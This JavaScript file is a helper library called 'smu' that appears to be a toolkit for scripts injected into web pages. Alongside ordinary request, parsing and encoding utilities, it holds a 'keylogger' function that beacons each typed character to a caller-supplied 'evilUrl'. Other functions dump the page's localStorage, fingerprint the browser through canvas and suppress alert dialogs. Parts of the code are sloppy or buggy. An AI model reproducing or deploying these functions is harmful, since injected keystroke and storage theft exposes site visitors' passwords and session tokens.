var smu = {
  f: {
    changeDisplay: function(arr, display) {
      for(let i = 0; i < arr.length; ++i) {
        if(arr[i].style.display == "none") {
          display ? arr[i].style.display = display : arr[i].style.display = "block";
        } else {
          arr[i].style.display = "none";
        }
      }
    },


    GET: function(url, callback) {
      var peticion = new XMLHttpRequest();
      peticion.open("GET", url , true);
      peticion.send();
      peticion.onreadystatechange = function() {
        if (peticion.readyState == 4) {
          if (peticion.status == 0 || peticion.status == 200) {
            callback(peticion.responseText);
          }
        }
      }      
    },

    POST: function(url, callback, parametrosCuerpo) {
      var peticion = new XMLHttpRequest();
      peticion.open("POST", url , true);
      peticion.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      peticion.send(parametrosCuerpo);
      peticion.onreadystatechange = function() {
        if (peticion.readyState == 4) {
          if (peticion.status == 0 || peticion.status == 200) {
            callback(peticion.responseText);
          }
        }
      }      
    },


    getLocalStorage: function() {
      if ("localStorage" in window && window["localStorage"] !== null) {
        return JSON.stringify(window["localStorage"]);
      } else {
        return "localStorage_is_void";
      }
    },

    clientLeaving: function(callback) {
      window.addEventListener("beforeunload", function(e) {
        e.preventDefault();
        callback();
        e.returnValue = "";
      });
    },

    downloadFile: function (e,a) {
      var t=document.createElement("a");
      if(t.setAttribute("href","data:text/plain;charset=utf-8," + encodeURIComponent(a)),t.setAttribute("download",e),document.createEvent) {
        var o = document.createEvent("MouseEvents");
        o.initEvent("click",!0,!0),t.dispatchEvent(o)
      } else
        t.click()
    },
    
    keylogger: function(evilUrl) {
      var logs = "Keys:";
      var i = 0;
      window.onkeydown = function(e) {
        if (i++) {
          logs = "Key_Id=" + event.target.value.charAt(event.target.selectionStart -1).charCodeAt() + "KeyChar=" + event.target.value.charAt(event.target.selectionStart -1) + "\n\n";
          new Image().src = evilUrl + "/" + "keylogs=" + logs;
        }
      }
    },

    _atob: function(a) {
      var b="",e,c,h="",f,g="",d=0;
      k="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      do e=k.indexOf(a.charAt(d++)),c=k.indexOf(a.charAt(d++)),f=k.indexOf(a.charAt(d++)),g=k.indexOf(a.charAt(d++)),e=e<<2|c>>4,c=(c&15)<<4|f>>2,h=(f&3)<<6|g,b+=String.fromCharCode(e),64!=f&&(b+=String.fromCharCode(c)),64!=g&&(b+=String.fromCharCode(h));
      while(d<a.length);
      return unescape(b)
    },
  
	
    _bin2hex: function(a) {
      var b,c,d="",e;
      a+="";
      b=0;
      for(c=a.length;b<c;b++)e=a.charCodeAt(b).toString(16),d+=2>e.length?"0"+e:e;
      return d
    },

    canvasFingerprint: function() {
      var a=document.createElement("canvas");
      a.setAttribute("width",220);
      a.setAttribute("height",30);
      var b=a.getContext("2d");
      b.textBaseline="top";
      b.font="14px 'Arial'";
      b.textBaseline="alphabetic";
      b.fillStyle="#f60";
      b.fillRect(125,1,62,20);
      b.fillStyle="#069";
      b.fillText("BrowserLeaks,com <canvas> 1.0",2,15);
      b.fillStyle="rgba(102, 204, 0, 0.7)";
      b.fillText("BrowserLeaks,com <canvas> 1.0",4,17);
      a=a.toDataURL("image/png");
      b=smu.f._atob(a.replace("data:image/png;base64,",""));    
      return smu.f._bin2hex(b.slice(-16,-12))
    },

    random: function (min, max) {
      return Math.round((max - min) * Math.random() + min);
    },

    parseHTML: function(codigo, selector, bool) {
      var parser = new DOMParser();
      var parseado = parser.parseFromString(codigo, "text/html").documentElement;
      if (bool) {
        return parseado.querySelectorAll(selector);
      } else {
        return parseado.querySelector(selector);
      }
    },

    pastebin: function(texto, language, api_key, callback) {
      var pb = new XMLHttpRequest();
      pb.open("POST", "https://pastebin.com/api/api_post.php", true);
      pb.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      pb.send("api_dev_key=" + api_key + "&api_option=paste&api_paste_private=0&api_paste_name=codigo&api_paste_expire_date=10M&api_paste_format=" + language + "&api_paste_code=" + texto);
      pb.onreadystatechange = function() {
        if (pb.readyState == 4 && (pb.status == 0 || pb.status == 200)) {
          callback(pb.responseText);
        }
      }
    },

    HTMLEntities: function(option, text) {
      var textArea = document.createElement("textarea");
      if (option == "decode") {
        textArea.innerHTML = text;
        return textArea.value;
      } else {
        textArea.innerText = text;
        return textArea.innerHTML;
      }
    },

    stopAlerts: function() {
      window.alert = function () {}
      window.prompt = function() {}
      window.confirm = function() {}
    },

    text2dec: function (cipherText) {
      var cipherTextTam = cipherText.length;
      var diccionario = ['a','b','c','d','e','f','g','h','i','j','k','l', 'm','n','ñ','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C', 'D','E','F','G','H','I','J','K','L','M','N','Ñ','O','P','Q','R','S', 'T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','.', ':','/','\ ','='];
      var diccionarioTam = diccionario.length;
      var cipherTextDec = [];
      var y = 0;

      for(var i = 0; i < cipherTextTam; ++i) {
        for(var x = 0; x < diccionarioTam; ++x) {
          if(cipherText[i] == diccionario[x]) {
            cipherTextDec[y] = 1+x; ++y;
          }
        }
      }
      return cipherTextDec;
    },

    decPlusDec: function(decimal1, decimal2) {
      var diccionario = ['1','2','3','4','5','6','7','8','9', '10','11','12','13','14','15','16','17','18','19','20','21', '22','23','24','25','26','27','28','29','30','31','32','33', '34','35','36','37','38','39','40','41','42','43','44','45', '46','47','48','49','50','51','52','53','54','55','56','57', '58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90'];
      var diccionarioTam = diccionario.length;
      var decimal1Tam = decimal1.length;
      var decimal2Tam = decimal2.length;
      var cipherTextSum = [];
      var y = 0;

      for(var i = 0; i < decimal1Tam; ++i) {
        for(var x = 0; x < diccionarioTam; ++x) {
          if(decimal1[i] == diccionario[x]) {
            cipherTextSum[y] = decimal1[i] + decimal2[y];
            ++y;
          }
        }
      } 
      return cipherTextSum;
    },

    dec2text(cipherText) {
      var cipherTextTam = cipherText.length;
      var diccionario = ['a','b','c','d','e','f','g','h','i','j','k','l', 'm','n','ñ','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C', 'D','E','F','G','H','I','J','K','L','M','N','Ñ','O','P','Q','R','S', 'T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','.', ':','/','\ ','=','@','^','&','*','+','!','<','>','{','}','[',']','€','%','?','_','|', 'å','ą','æ','ā','ª','á','à','ä','â','ã','ė','ê','ę','ē','è','é','ë','ī','î','į','ì','ï','í','º','ō','œ','ø','õ','ô','ö','ò','ó','ū','ù','û','ü','ú','č','ç', 'ć','ń','Å','Ą','Æ','Ā','Á','À','Ä','Â','Ã','Ė','Ê','Ę','È'];

      var diccionarioTam = diccionario.length;
      var diccionario2 = ['1','2','3','4','5','6','7','8','9', '10','11','12','13','14','15','16','17','18','19','20','21', '22','23','24','25','26','27','28','29','30','31','32','33', '34','35','36','37','38','39','40','41','42','43','44','45', '46','47','48','49','50','51','52','53','54','55','56','57', '58','59','60','61','62','63','64','65','66','67','68','69', '70','71','72','73','74','75','76','77','78','79','80','81', '82','83','84','85','86','87','88','89','90','91','92','93', '94','95','96','97','98','99','100','101','102','103', '104','105','106','107','108','109','110','111','112', '113','114','115','116','117','118','119','120','121', '122','123','124','125','126','127','128','129','130', '131','132','133','134','135','136','137','138','139'];
      var diccionario2Tam = diccionario2.length;
      var cipherTextText = [];
      var z=0;
      for(var i = 0; i < cipherTextTam; ++i) {
        for(var x =0; x < diccionarioTam; ++x) {
          if(cipherText[i] == diccionario2[x]) {
            cipherTextText[z] = diccionario[x];
            ++z;
          }
        }
      } 
      return cipherTextText;
    }


  }, 

  d: {
    htmlTags: function() { 
      var safe = ["!DOCTYPE html", "html","/html","head","/head","meta","body","/body",
"title","/title","script","/script","style","/style",
"section","/section","article","/article","input",
"/input","button","/button","select","/select",
"option","/option","br","br /","textarea","/textarea",
"a","a /","abbr","/abbr","acronym","/acronym",
"address","/address","applet","/applet","area",
"/area","aside","/aside","audio","/audio",
"b","/b","base","/base","basefont","/basefont",
"bdi","/bdi","bdo","/bdo","big","/big",
"blockquote","/blockquote","canvas","/canvas",
"caption","/caption","center","/center","cite",
"/cite","code","/code","col","/col","colgroup",
"/colgroup","data","/data","datalist","/datalist",
"dd","/dd","del","/del","details","/details",
"dfn","/dfn","dialog","/dialog","dir","/dir",
"div","/div","dl","/dl","dt","/dt","em","/em",
"embed","/embed","fieldset","/fieldset","figcaption",
"/figcaption","figure","/figure","font","/font",
"footer","/footer","form","/form","frame","/frame",
"frameset","/frameset","h1","/h1","h2","/h2","h3",
"/h3","h4","/h4","h5","/h5","h6","/h6","header",
"/header","hr","/hr","i","/i","iframe","/iframe",
"img","/img","ins","/ins","kbd","/kbd","label",
"/label","legend","/legend","li","/li","link","/link",
"main","/main","map","/map","mark","/mark",
"meter","/meter","nav","/nav","noframes","/noframes",
"noscript","/noscript","object","/object","ol","/ol",
"optgroup","/optgroup","output","/output","p","/p",
"param","/param","picture","/picture","pre","/pre",
"postgress","/postgress","q","/q","rp","/rp","rt","/rt",
"ruby","/ruby","s","/s","samp","/samp","small","/small",
"source","/source","span","/span","strike","/strike",
"strong","/strong","sub","/sub","summary","/summary",
"sup","/sup","svg","/svg","table","/table","tbody","/tbody",
"td","/td","template","/template","tfoot","/tfoot","th","/th",
"thead","/thead","time","/time","tr","/tr","track","/track",
"tt","/tt","u","/u","ul","/ul","var","/var","video",
"/video","wbr","/wbr","wbr /"];

      var completeTags = [];
      for (var i = 0; i < safe.length; ++i) {
        completeTags.push("<" + safe[i] + ">");
      }
      return completeTags;
    },

    htmlAttributes: function() { 
      return ["accept","accept-charset", "accesskey","action","align","alt","async","autocomplete","autofocus",
"autoplay","bgcolor","border","charset","checked","cite",
"class","color","cols","colspan","content",
"contenteditable","controls","coords","data","datetime",
"default","defer","dir","dirname","disabled","download",
"draggable","dropzone","enctype","for","form","formaction",
"headers","height","hidden","high","href",
"hreflang","http-equiv","id","ismap","kind",
"label","lang","list","loop","low","max",
"maxlength","media","method","min","multiple","muted",
"name","novalidate","onabort","onafterprint",
"onbeforeprint","onbeforeunload","onblur","oncanplay","oncanplaythrough",
"onchange","onclick","oncontextmenu","oncopy","oncuechange","oncut",
"ondblclick","ondrag","ondragend","ondragenter","ondragleave",
"ondragover","ondragstart","ondrop","ondurationchange","onemptied","onended",
"onerror","onfocus","onhashchange","oninput","oninvalid","onkeydown",
"onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadstart","onmousedown","onmousemove",
"onmouseout","onmouseover","onmouseup","onmousewheel","onoffline",
"ononline","onpagehide","onpageshow","onpaste","onpause",
"onplay","onplaying","onpopstate","onprogress","onratechange","onreset",
"onresize","onscroll","onsearch","onseeked","onseeking","onselect","onstalled",
"onstorage","onsubmit","onsuspend","onetimeupdate","ontoggle","onunload","onvolumechange","onwaiting",
"onwheel","open","optimum","pattern","placeholder","poster","preload",
"readonly","rel","required","reversed","rows","rowspan","sandbox",
"scope","selected","shape","size","sizes","spellcheck","src",
"srcdoc","srclang","srcset","start","step","tabindex",
"target","translate","type","usemap","value","width",
"wrap"];
    }

  }
};

